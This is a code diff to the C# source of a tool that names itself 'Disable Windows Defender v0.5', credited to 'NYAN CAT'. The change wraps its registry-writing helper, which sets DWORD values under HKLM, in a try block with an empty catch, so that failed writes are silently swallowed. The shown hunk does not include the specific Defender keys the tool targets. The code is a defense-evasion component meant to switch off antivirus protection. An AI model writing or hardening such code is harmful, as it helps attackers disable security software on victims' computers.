@@ -2,7 +2,6 @@
 using System;
 using System.Diagnostics;
 using System.Security.Principal;
-using System.Threading;
 
 //       │ Author     : NYAN CAT
 //       │ Name       : Disable Windows Defender v0.5
@@ -28,16 +27,20 @@ namespace Disable_Windows_Defender
 
         private static void RegistryEdit(string regPath, string name, string value)
         {
-            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree))
+            try
             {
-                if (key == null)
+                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree))
                 {
-                    Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, value, RegistryValueKind.DWord);
-                    return;
+                    if (key == null)
+                    {
+                        Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, value, RegistryValueKind.DWord);
+                        return;
+                    }
+                    if (key.GetValue(name) != (object)value)
+                        key.SetValue(name, value, RegistryValueKind.DWord);
                 }
-                if (key.GetValue(name) != (object)value)
-                    key.SetValue(name, value, RegistryValueKind.DWord);
             }
+            catch { }
         }
 
         private static void CheckDefender()
